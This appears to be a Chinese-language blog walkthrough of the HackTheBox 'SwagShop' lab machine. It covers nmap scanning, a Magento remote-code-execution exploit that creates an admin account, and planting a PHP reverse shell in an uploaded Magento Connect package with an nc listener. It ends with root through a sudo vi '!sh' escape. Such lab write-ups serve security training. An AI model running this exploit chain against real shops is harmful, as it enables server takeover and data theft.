---
title: pentest HackTheBox swagshop 20190814
date: 2019-08-14 11:14:54
tags: [HackTheBox]
categories: [Network Security]
---

### 一、nmap收集信息

![nmap](/sourcepictures/2019/08/14/1.png)

可以看到22， 80端口开放

### 二、访问80端口

![web](/sourcepictures/2019/08/14/2.png)

可以看到网站是使用magento搭建的网站，Magento是一款新的专业开源电子商务平台，采用php进行开发，使用Zend Framework框架。

### 三、查找magento漏洞

```sh
searchsploit magento
```

![magento exploit](/sourcepictures/2019/08/14/3.png)

很多漏洞可以利用

选择远程代码执行，37977.py，修改代码

```py
target = "http://10.10.10.140/index.php"
if target.endswith("/"):
    target = target[:-1]
target_url = target + "/admin/Cms_Wysiwyg/directive/index/"

```

注意，一定要加上`/index.php`

执行：

```sh
root@kali2019:~/Desktop# python 37977.py 
WORKED
Check http://10.10.10.140/index.php/admin with creds forme:forme
```

### 四、反弹shell

访问`http://10.10.10.140/index.php/admin`，并登陆

下载[LavaMagentoBD](https://github.com/lavalamp-/LavaMagentoBD)，解压

把本地`/usr/share/webshells/php/php-reverse-shell.php`文件，修改ip地址为本机ip地址，保存

然后，替换`app\code\community\Lavalamp\Connector\controllers\IndexController.php`

重新打包，并上传`System>Magento Connect>Magento Connect Manager>Direct package file upload`。

```sh
tar zxvf lavalamp_magento_bd.tgz
vim /usr/share/webshells/php/php-reverse-shell.php
rm app\code\community\Lavalamp\Connector\controllers\IndexController.php
mv /usr/share/webshells/php/php-reverse-shell.php app\code\community\Lavalamp\Connector\controllers\IndexController.php
tar zcvf bd.tgz
```

本地监听：  
```sh
nc -v -n -l -p 1234
```

访问[http://10.10.10.140/app/code/community/Lavalamp/Connector/controllers/IndexController.php](http://10.10.10.140/app/code/community/Lavalamp/Connector/controllers/IndexController.php)，即可返回shell

### 五、获取目标hash

查看执行sudo的权限：  

```sh
$ sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
$ 
```

可以发现`/usr/bin/vi`可以执行sudo

```sh
$ ls /home        
haris
$ ls /home/haris
user.txt
$ /usr/bin/vi /home/haris/user.txt
```
可以获得user用户hash

执行

```sh
sudo /usr/bin/vi /var/www/html/test -c '!sh'
cat /root/root.txt
```
可以获得root用户hash



